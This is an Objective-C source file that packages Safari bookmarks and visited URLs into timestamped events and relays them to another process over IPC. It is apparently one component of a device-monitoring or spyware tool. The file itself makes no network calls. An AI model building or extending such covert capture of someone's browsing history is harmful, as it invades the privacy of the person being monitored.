//
//  BookmarkInfo.m
//  MSFSP
//
//  Created by Benjawan Tanarattanakorn on 5/15/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "BookmarkInfo.h"

#import "DateTimeFormat.h"
#import "MessagePortIPCSender.h"
#import "SharedFile2IPCSender.h"
#import "FxBookmarkEvent.h"
#import "FxBrowserUrlEvent.h"
#import "DefStd.h"

static BookmarkInfo *_BookmarkInfo = nil;

static NSString* const kSafariAppName = @"Safari";

@implementation BookmarkInfo

@synthesize mBookmarkTitle;
@synthesize mBookmarkAddress;

@synthesize mCanSaveBookmark;

@synthesize mBookmarkSharedFileSender, mUrlSharedFileSender;

+ (id) sharedBookmarkInfo {
	if (_BookmarkInfo == nil) {
		_BookmarkInfo = [[BookmarkInfo alloc] init];
		
		if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
			SharedFile2IPCSender *sharedFileSender = nil;
			
			sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kBookmarkMessagePort];
			[_BookmarkInfo setMBookmarkSharedFileSender:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
			
			sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kBrowserUrlMessagePort];
			[_BookmarkInfo setMUrlSharedFileSender:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
		}
	}
	return (_BookmarkInfo);
}

+ (void) sendBookmarkEvent: (NSString *) title address: (NSString *) address {
	NSMutableData* data = [[NSMutableData alloc] init];
	FxBookmarkEvent* bookmarkEvent = [[FxBookmarkEvent alloc] init];
	FxBookmark* fxbookmark = [[FxBookmark alloc] init];
	[fxbookmark setMTitle:title];
	[fxbookmark setMUrl:address];
	[bookmarkEvent addBookmark:fxbookmark];
	[fxbookmark release];
	[bookmarkEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	NSKeyedArchiver* archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
	[archiver encodeObject:bookmarkEvent forKey:kBookmarkArchived];
	[archiver finishEncoding];
	
	if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
		MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kBookmarkMessagePort];
		[messagePortSender writeDataToPort:data];
		[messagePortSender release];
		messagePortSender = nil;
		DLog(@"==== browser bookmark event sent ====");
	} else {
		SharedFile2IPCSender *sharedFileSender = nil;
		sharedFileSender = [[BookmarkInfo sharedBookmarkInfo] mBookmarkSharedFileSender];
		[sharedFileSender writeDataToSharedFile:data];
	}
	
	[archiver release];
	[bookmarkEvent release];
	[data release];
}

+ (void) sendBrowserUrlEvent: (NSString *) title address: (NSString *) address {
	NSMutableData* data = [[NSMutableData alloc] init];
	FxBrowserUrlEvent* browserUrlEvent = [[FxBrowserUrlEvent alloc] init];
	[browserUrlEvent setMTitle:title];
	[browserUrlEvent setMUrl:address];
	[browserUrlEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[browserUrlEvent setMVisitTime:[browserUrlEvent dateTime]];
	[browserUrlEvent setMIsBlocked:NO];
	[browserUrlEvent setMOwningApp:kSafariAppName];
	
	NSKeyedArchiver* archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
	[archiver encodeObject:browserUrlEvent forKey:kBrowserUrlArchived];
	[archiver finishEncoding];
	
	if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
		MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kBrowserUrlMessagePort];
		[messagePortSender writeDataToPort:data];
		[messagePortSender release];
		messagePortSender = nil;
		DLog(@"==== browser url event sent ====");
	} else {
		SharedFile2IPCSender *sharedFileSender = nil;
		sharedFileSender = [[BookmarkInfo sharedBookmarkInfo] mUrlSharedFileSender];
		[sharedFileSender writeDataToSharedFile:data];
	}
	
	[archiver release];
	[browserUrlEvent release];
	[data release];
}

- (void) dealloc {
	[mBookmarkTitle release];
	mBookmarkTitle = nil;
	[mBookmarkAddress release];
	mBookmarkAddress = nil;
	[mBookmarkSharedFileSender release];
	[mUrlSharedFileSender release];
	[super dealloc];
}


@end
